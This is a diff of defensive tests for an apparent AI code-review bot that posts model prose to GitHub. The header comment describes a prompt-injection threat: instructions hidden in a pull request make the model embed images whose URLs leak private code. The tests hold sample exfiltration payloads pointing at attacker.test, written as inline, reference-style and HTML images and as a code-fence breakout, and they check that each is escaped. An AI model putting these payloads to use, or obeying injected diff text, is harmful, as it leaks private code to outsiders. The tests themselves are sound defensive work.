@@ -329,3 +329,103 @@ def test_a_pipe_in_a_cell_cannot_break_the_table() -> None:
     table_row = [line for line in body.splitlines() if line.startswith("| `")][0]
     # Four unescaped pipes: the row's own delimiters, and no more.
     assert len([c for i, c in enumerate(table_row) if c == "|" and table_row[i - 1] != "\\"]) == 3
+
+
+# ── Untrusted model prose ─────────────────────────────────────────────────────
+#
+# The threat these cover: a stranger opens a pull request whose diff carries an
+# instruction, the model obeys it, and the resulting review body is posted to
+# GitHub by Liffy's own account. An image in that body is fetched server-side on
+# render, so a URL carrying retrieved private code exfiltrates it with nobody
+# clicking anything. Each spelling of "image" gets its own test because each one
+# evades a defence aimed only at the others.
+
+
+def test_inline_image_is_defused_in_a_comment() -> None:
+    exfil = "![](https://attacker.test/?d=SECRET)"
+    body = partition_comments(
+        [_comment(text=f"Looks fine. {exfil}")], parse_diff(TWO_HUNK_DIFF)
+    )[0][0]["body"]
+
+    assert "![](" not in body
+    assert r"!\[" in body
+
+
+def test_reference_style_image_is_defused() -> None:
+    """The form that survives any regex matching `![...](...)` as a whole.
+
+    Its URL lives in a separate link-definition line, so the construct the
+    naive pattern looks for never appears — which is why the escape goes on
+    `![` instead.
+    """
+    body = partition_comments(
+        [_comment(text="Fine.\n\n![leak][x]\n\n[x]: https://attacker.test/?d=SECRET")],
+        parse_diff(TWO_HUNK_DIFF),
+    )[0][0]["body"]
+
+    assert "![leak][x]" not in body
+    assert r"!\[leak][x]" in body
+
+
+def test_html_image_tag_is_defused() -> None:
+    """GitHub permits a few raw tags, and several of them fetch on render."""
+    body = partition_comments(
+        [_comment(text='ok <img src="https://attacker.test/?d=SECRET">')],
+        parse_diff(TWO_HUNK_DIFF),
+    )[0][0]["body"]
+
+    assert "<img" not in body
+    assert "&lt;img" in body
+
+
+def test_plain_links_survive() -> None:
+    """Deliberate: a link needs a click, and citing a URL is real review work."""
+    body = partition_comments(
+        [_comment(text="See [the docs](https://example.com/guide) for why.")],
+        parse_diff(TWO_HUNK_DIFF),
+    )[0][0]["body"]
+
+    assert "[the docs](https://example.com/guide)" in body
+
+
+def test_ordinary_prose_is_untouched() -> None:
+    text = "`parse()` returns None here, so line 12 raises. Use a guard."
+    body = partition_comments([_comment(text=text)], parse_diff(TWO_HUNK_DIFF))[0][0]["body"]
+
+    assert text in body
+
+
+def test_suggestion_cannot_break_out_of_its_fence() -> None:
+    """A suggestion holding ``` would otherwise close the block early and put
+    everything after it back into rendered markdown."""
+    escape = '```\n\n![](https://attacker.test/?d=SECRET)\n\n```'
+    body = partition_comments(
+        [_comment(suggestion=escape)], parse_diff(TWO_HUNK_DIFF)
+    )[0][0]["body"]
+
+    opening = [line for line in body.splitlines() if line.endswith("suggestion")][0]
+    fence = opening[: -len("suggestion")]
+    # Longer than any run inside, so nothing in the payload can close it early.
+    assert len(fence) > 3
+    assert fence not in escape
+
+
+def test_summary_is_defanged_in_the_review_body() -> None:
+    body = build_review_body(
+        "All good. ![](https://attacker.test/?d=SECRET)",
+        event=ReviewEvent("COMMENT"),
+        unanchorable=[],
+    )
+
+    assert "![](" not in body
+
+
+def test_unanchorable_comment_text_is_defanged() -> None:
+    """The appendix path renders model prose too, and was the easiest to miss."""
+    body = build_review_body(
+        "Summary.",
+        event=ReviewEvent("COMMENT"),
+        unanchorable=[_comment(text="![](https://attacker.test/?d=SECRET)")],
+    )
+
+    assert "![](" not in body
